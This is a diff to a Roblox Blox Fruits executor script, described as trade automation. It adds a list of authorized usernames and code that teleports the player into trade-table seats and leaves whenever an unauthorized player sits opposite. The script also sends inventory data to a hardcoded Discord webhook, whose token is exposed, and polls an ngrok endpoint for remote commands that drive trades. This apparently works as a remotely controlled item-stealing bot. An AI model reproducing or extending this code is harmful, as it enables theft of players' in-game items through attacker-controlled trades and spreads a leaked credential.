@@ -8,7 +8,7 @@ getgenv().bfRunning = true
 print("[DEBUG] Initializing Finalized Blox Fruits Trade Automation...")
 
 local Config = {
-    AuthorizedUser = "BLACKGOKU_0707",
+    AuthorizedUsers = { "BLACKGOKU_0707", "Aid3no" },
     WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
     CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
 }
@@ -16,6 +16,7 @@ local Config = {
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local Workspace = game:GetService("Workspace")
 local LocalPlayer = Players.LocalPlayer
 
 local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
@@ -23,6 +24,15 @@ local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
 local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)
 
 local requestFunc = syn and syn.request or http_request or request
+
+local function IsAuthorized(username)
+    for _, name in ipairs(Config.AuthorizedUsers) do
+        if name == username then
+            return true
+        end
+    end
+    return false
+end
 
 local function GetInventory()
     local success, result = pcall(function()
@@ -68,6 +78,54 @@ local function TransmitTelemetry()
     end
 end
 
+-- Precise check targeting only P1 and P2 chairs inside TradeTable instances
+local function IsTradeTableSeat(seat)
+    local parent = seat.Parent
+    if parent and parent.Name == "TradeTable" then
+        if seat.Name == "P1" or seat.Name == "P2" then
+            return true
+        end
+    end
+    return false
+end
+
+local function ManageSeating()
+    local character = LocalPlayer.Character
+    if not character or not character:FindFirstChild("HumanoidRootPart") then return end
+    local hrp = character.HumanoidRootPart
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return end
+
+    if humanoid.SeatPart then
+        local seat = humanoid.SeatPart
+        local occupant = seat.Occupant
+        if occupant and occupant ~= humanoid then
+            local sittingPlayer = Players:GetPlayerFromCharacter(occupant.Parent)
+            if sittingPlayer and not IsAuthorized(sittingPlayer.Name) then
+                print("[DEBUG] Unauthorized player detected in trade chair. Jumping...")
+                humanoid.Jump = true
+                task.wait(0.5)
+            end
+        end
+        return
+    end
+
+    pcall(function()
+        for _, obj in pairs(Workspace:GetDescendants()) do
+            if obj:IsA("Seat") and IsTradeTableSeat(obj) then
+                if not obj.Occupant then
+                    if (hrp.Position - obj.Position).Magnitude < 400 then
+                        hrp.CFrame = obj.CFrame + Vector3.new(0, 3, 0)
+                        task.wait(0.3)
+                        obj:Sit(humanoid)
+                        break
+                    end
+                end
+            end
+        end
+    end)
+end
+
 local function InvokeTradeAction(action)
     if not TradeFunction then
         warn("[ERROR] TradeFunction remote missing!")
@@ -97,6 +155,8 @@ task.spawn(function()
 
     while true do
         task.wait(2)
+        pcall(ManageSeating)
+
         pcall(function()
             local response = requestFunc({
                 Url = Config.CommandApiUrl,
